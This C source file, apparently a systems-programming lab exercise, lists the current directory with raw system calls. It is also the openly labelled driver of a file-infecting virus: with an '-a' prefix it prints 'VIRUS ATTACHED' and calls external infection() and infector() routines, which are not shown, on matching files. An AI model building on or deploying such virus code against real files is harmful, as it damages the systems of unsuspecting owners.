#include "util.h"

#define GETDENTS 141
#define STDOUT 1
#define O_RDONLY 00 
#define EXIT 1 
#define WRITE 4
#define OPEN 5
#define ERROR 0x55
#define SIZE 8192 

extern int system_call();
extern void infection();
extern void infector(char *);

/* Flag for prefix mode */
int isPrefixModeEnabled = 0;
/* Prefix to check against directory entries */
char *prefix = '\0';
/* Length of the prefix to avoid calculating it multiple times */
int prefixLength = 0;

/* Directory entry structure */
typedef struct ent
{
    int inode;   
    int offset;  
    short len;   
    char buf[1]; 
} DirectoryEntry;

/* Function to print a string */
void print(char *str);

int main(int argc, char *argv[], char *envp[])
{
    int i;
    /* Loop over command line arguments to check if prefix mode is enabled */
    for (i = 1; i < argc; i++)
    {
        if (strncmp(argv[i], "-a", 2) == 0)
        {
            isPrefixModeEnabled = 1;
            prefix = argv[i] + 2;
            prefixLength = strlen(prefix);
            break; /* No need to keep looping once we've found the prefix */
        }
    }

    /* Open the current directory */
    int currentDirectory = system_call(OPEN, ".", O_RDONLY, 0777);
    /* If opening the directory failed, exit with error */
    if (currentDirectory < 0)
    {
        system_call(EXIT, ERROR);
    }

    char buffer[SIZE];
    int readBytesCount;

    /* Read directory entries */
    readBytesCount = system_call(GETDENTS, currentDirectory, buffer, SIZE); 
    /* If reading directory entries failed, exit with error */
    if (readBytesCount == -1)
    {
        system_call(EXIT, ERROR);
    }
     int currentPosition ;   
    /* Loop over directory entries */
    for (currentPosition = 0; currentPosition < readBytesCount; currentPosition += ((DirectoryEntry *)(buffer + currentPosition))->len)
    {
        DirectoryEntry *directoryEntry = (DirectoryEntry *)(buffer + currentPosition);
        print(directoryEntry->buf);
        
        /* If prefix mode is enabled and directory name matches prefix */
        if (isPrefixModeEnabled && strncmp(directoryEntry->buf, prefix, prefixLength) == 0)
        {
            print(" VIRUS ATTACHED");
            infection();
            infector(directoryEntry->buf);
        }
        
        print("\n");
    }

    return 0;
}

void print(char *str)
{
    system_call(WRITE, STDOUT, str, strlen(str));
}
